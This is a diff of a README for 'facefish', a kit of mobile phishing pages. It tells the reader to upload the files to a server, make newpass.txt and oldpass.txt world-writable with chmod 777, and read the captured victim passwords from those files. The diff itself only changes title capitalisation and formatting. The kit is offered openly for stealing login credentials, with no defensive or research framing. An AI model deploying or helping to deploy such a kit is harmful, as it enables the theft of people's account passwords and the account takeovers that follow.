@@ -1,4 +1,4 @@
-# facefish
+# Facefish
 
 Hi guys !
 Let me tell you something about facefish.
@@ -11,7 +11,8 @@ This phishing pages are really built for mobile devices and it won't go good wit
 
 * Upload all files to the server
 * Give all permissons to newpass.txt and oldpass.txt
-.chmod 777 newpass.txt oldpass.txt
+
+chmod 777 newpass.txt oldpass.txt
 
 You will get sniffed passwords in oldpass.txt and newpass.txt
 
